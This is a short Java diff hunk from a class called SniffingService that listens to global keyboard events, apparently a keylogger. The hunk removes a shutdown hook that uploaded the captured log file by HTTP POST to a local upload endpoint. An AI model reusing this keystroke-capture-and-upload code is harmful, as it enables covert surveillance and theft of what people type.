@@ -34,43 +34,6 @@ public class SniffingService implements NativeKeyListener {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            System.out.println("Program is being forced to stop.");
-            File file = new File(pathName);
-
-            // Create CloseableHttpClient
-            try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
-
-                // Create the POST request
-                HttpPost uploadFile = new HttpPost("http://localhost:8080/upload");
-
-                // Build the multipart request with the file
-                HttpEntity multipartEntity = MultipartEntityBuilder.create()
-                        .addBinaryBody("file", file)  // "file" is the form field name expected by the server
-                        .build();
-
-                // Set the multipart entity as the request body
-                uploadFile.setEntity(multipartEntity);
-
-                // Execute the request
-                try (CloseableHttpResponse response = httpClient.execute(uploadFile)) {
-                    // Print the response details
-                    System.out.println("Response code: " + response.getCode());
-                    System.out.println("Response body: " + EntityUtils.toString(response.getEntity()));
-                } catch (ParseException e) {
-                    throw new RuntimeException(e);
-                }
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            try {
-                if (writer != null) {
-                    writer.close();
-                }
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }));
     }
 
     public void startSniffing() {
